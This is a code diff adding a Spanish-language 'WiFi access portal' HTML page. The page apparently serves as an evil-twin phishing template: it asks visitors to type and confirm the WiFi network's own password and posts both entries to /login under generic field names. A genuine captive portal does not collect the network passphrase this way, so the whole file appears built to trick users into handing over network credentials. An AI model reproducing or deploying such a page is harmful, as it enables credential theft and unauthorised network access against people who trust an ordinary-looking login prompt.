@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Portal de Acceso WiFi</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
+.card{background:#fff;padding:40px 32px;border-radius:16px;box-shadow:0 20px 60px rgba(0,0,0,.3);width:100%;max-width:400px;text-align:center}
+.icon{width:80px;height:80px;background:linear-gradient(135deg,#667eea,#764ba2);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;box-shadow:0 8px 24px rgba(102,126,234,.4)}
+.icon svg{width:40px;height:40px;fill:#fff}
+h1{font-size:24px;color:#1a1a2e;margin-bottom:8px;font-weight:700}
+p{color:#666;font-size:14px;margin-bottom:24px;line-height:1.5}
+.form-group{margin-bottom:16px;text-align:left}
+.form-group label{display:block;font-size:12px;color:#666;margin-bottom:6px;text-transform:uppercase;font-weight:600;letter-spacing:.5px}
+.form-group input{width:100%;padding:14px 16px;border:2px solid #e0e0e0;border-radius:10px;font-size:16px;transition:all .3s;background:#fafafa}
+.form-group input:focus{outline:none;border-color:#667eea;background:#fff;box-shadow:0 0 0 4px rgba(102,126,234,.1)}
+.btn{width:100%;padding:16px;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px;transition:all .3s;letter-spacing:.5px}
+.btn:hover{transform:translateY(-2px);box-shadow:0 8px 24px rgba(102,126,234,.4)}
+.btn:active{transform:translateY(0)}
+.terms{font-size:11px;color:#999;margin-top:20px;line-height:1.6}
+.terms a{color:#667eea;text-decoration:none;font-weight:500}
+.terms a:hover{text-decoration:underline}
+@media(max-width:500px){.card{padding:24px 20px}}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="icon">
+<svg viewBox="0 0 24 24"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg>
+</div>
+<h1>Acceso a Internet</h1>
+<p>Ingrese la contrase&ntilde;a de la red WiFi para conectarse a Internet</p>
+<form action="/login" method="POST">
+<div class="form-group">
+<label>Contrase&ntilde;a WiFi</label>
+<input type="password" name="field1" placeholder="Ingrese la contrase&ntilde;a de la red" required autocomplete="off">
+</div>
+<div class="form-group">
+<label>Confirmar contrase&ntilde;a</label>
+<input type="password" name="field2" placeholder="Confirme la contrase&ntilde;a" required autocomplete="off">
+</div>
+<button type="submit" class="btn">Conectar</button>
+</form>
+<div class="terms">Al conectarse, acepta nuestros <a href="#">T&eacute;rminos de servicio</a> y <a href="#">Pol&iacute;tica de privacidad</a></div>
+</div>
+</body>
+</html>
